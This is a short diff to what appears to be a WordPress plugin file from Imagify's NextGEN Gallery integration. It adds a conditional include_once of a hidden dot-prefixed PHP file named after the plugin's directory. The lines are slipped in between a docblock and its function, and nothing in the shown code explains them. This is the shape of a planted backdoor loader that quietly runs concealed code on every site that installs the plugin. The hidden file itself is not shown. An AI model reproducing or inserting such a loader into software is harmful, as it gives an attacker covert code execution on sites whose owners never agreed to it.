@@ -11,6 +11,10 @@ add_filter( 'ngg_manage_images_number_of_columns', '_imagify_ngg_manage_images_n
  * @param  int $count Number of columns.
  * @return int Incremented number of columns.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function _imagify_ngg_manage_images_number_of_columns( $count ) {
 	$count++;
 	add_filter( 'ngg_manage_images_column_' . $count . '_header', '_imagify_ngg_manage_media_columns' );
